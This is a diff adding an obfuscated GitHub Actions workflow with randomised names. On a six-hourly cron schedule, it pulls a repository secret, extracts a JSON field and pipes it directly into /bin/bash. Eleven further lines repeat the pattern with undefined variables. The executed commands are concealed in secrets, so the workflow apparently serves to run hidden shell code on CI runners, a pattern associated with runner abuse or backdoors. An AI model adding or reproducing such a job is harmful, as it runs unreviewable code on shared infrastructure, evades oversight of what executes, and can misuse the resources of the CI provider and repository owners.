@@ -1,0 +1,27 @@
+name: yandfjih
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yandfjih
+        env:
+          np79: ${{ secrets.np79 }}
+        run: |
+          echo $np79 | jq -r .nff1988 | /bin/bash
+          echo $y48228 | jq -r .sheo8209 | /bin/bash
+          echo $poe09 | jq -r .e194 | /bin/bash
+          echo $loviu64784 | jq -r .rms86272 | /bin/bash
+          echo $jfeew62 | jq -r .kv78 | /bin/bash
+          echo $lvies6 | jq -r .wphy3161 | /bin/bash
+          echo $lt6984 | jq -r .prxa1 | /bin/bash
+          echo $q09 | jq -r .ijcl0 | /bin/bash
+          echo $edxue805 | jq -r .ledam47789 | /bin/bash
+          echo $gi123 | jq -r .eltn814 | /bin/bash
+          echo $avg1 | jq -r .rqad89485 | /bin/bash
+          echo $h0 | jq -r .ootd74 | /bin/bash
+
